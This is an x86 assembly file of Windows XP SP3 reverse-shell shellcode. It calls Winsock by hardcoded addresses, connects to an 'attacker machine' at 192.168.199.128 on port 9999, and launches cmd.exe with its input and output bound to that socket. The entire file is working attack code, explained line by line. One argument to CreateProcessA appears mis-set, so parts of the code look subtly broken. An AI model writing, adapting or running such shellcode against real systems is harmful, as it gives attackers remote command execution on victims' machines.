global _start

section .text

_start:

    ; clear direction flags
    cld

    ; WSAStartup() - initiates use of the Winsock DLL by a process
    xor eax, eax
    mov ax, 0x0190      ; sizeof (struct WSAData)
    sub esp, eax        ; allocate space for WSAData struct
    push esp            ; push pointer to WSAData struct
    push eax            ; push the version parameter
    mov ebx, 0x71ab6a55 ; ws2_32.dll WSAStartup WinXP SP3
    call ebx            ; call WSAStartup

    ; sleep for 30 seconds
    xor eax, eax        ; zero out eax
    push eax            ; bAlertable (False)
    mov ax, 0x7530      ; move 30 seconds (30,000 ms) into AX
    push eax            ; dwMilliseconds (30,000 mx)
    mov ebx, 0x7c802446 ; kernel32.dll/Sleep
    call ebx

    ; WSASocketA - create the socket
    xor eax, eax       	; clear eax
    push eax		; dwFlags
    push eax		; group
    push eax		; lpProtocolInfo
    xor ebx, ebx	; clear out ebx
    mov bl, 6		; setup for protocol
    push ebx		; protocol
    inc eax		; setup for type
    push eax		; type
    inc eax		; setup for af
    push eax		; af
    mov ebx, 0x71ab8b6a	; Address of WSASocketA WinXP SP3
    xor eax, eax	; clear eax
    call ebx		; call WSASocketA
    xchg eax, esi	; save socket into ESI

    ; connect() - connect to attacker machine
    push 0x80c7a8c0	; sockaddr.sin_addr.s_addr: 192.168.199.128
    push word 0x0F27   	; sockaddr.sin_port  9999
    xor ebx, ebx	; clear ebx
    add bl, 2		; sockaddr.sin_family     : AF_INET = 2
    push word bx 
    mov edx, esp	; pointer for s
    push byte 16	; length
    push edx		; pointer to s
    push esi		; saved socket
    mov ebx, 0x71ab4a07	; address of connect WinXP SP3
    call ebx		; call connect	

    ; setup pointer to cmd
    mov edx, 0x646d6363	; cmdd
    shr edx, 8		; cmd
    push edx		; push edx onto the stack
    mov ebx, esp	; pointer to "cmd"

    ; setup pointer to processinfo
    xor edx, edx
    xor ecx, ecx         ; clear out ecx
    mov cl, 0x04
    loop1:
      push edx
    loop loop1
    mov edi, esp         ; move pointer into ebx

    ; setup startupinfo 
    push esi		; hStdError - saved socket
    push esi		; hStdOutput - saved socket
    push esi		; hStdInput -saved socket
    push edx		; pReserved2 - NULL	
    push edx		; cbReserved2 -NULL
    xor eax, eax
    inc eax
    rol eax, 8			
    push eax		; dwFlags - STARTF_USESTDHANDLES 0x00000100
    push edx		; dwFillAttribute - NULL
    push edx		; dwYCountChars - NULL
    push edx		; dwXCountChars - NULL
    push edx		; dwYSize - NULL
    push edx		; dwXSize - NULL
    push edx		; dwY - NULL
    push edx		; dwX - NULL
    push edx		; pTitle - NULL
    push edx		; pDesktop - NULL
    push edx		; pReserved - NULL
    xor eax, eax
    add al, 44
    push eax		; cb - size of structure
    mov eax, esp	; pStartupInfo

    ; CreateProcessA() 
    push ebx		; pProcessInfo
    push eax		; pStartupInfo
    push edx		; CurrentDirectory - NULL
    push edx		; pEnvironment - NULL
    push edx		; CreationFlags - 0
    xor eax, eax
    inc eax
    push eax		; InheritHandles -TRUE - 1
    push edx		; pThreadAttributes -NULL
    push edx		; pProcessAttributes - NULL
    push ebx		; pCommandLine - pointer to "cmd"
    push edx		; ApplicationName - NULL
    mov ebx, 0x7c80236b	; CreateProcessA WinXP SP3
    call ebx

   ; WaitForSingleObject
   push edx             ; time to wait - 0=don't enter wait state
   push dword [edi]     ; pProcessInfo (process handle)
   mov eax, 0x7c802530  ; kernel32.dll/WaitForSingleObject
   call eax             ; call WaitForSingleObject

   ; Exit
   push edx
   mov ebx, 0x7c81cafa     ; ExitProcess(exitcode)
   call ebx

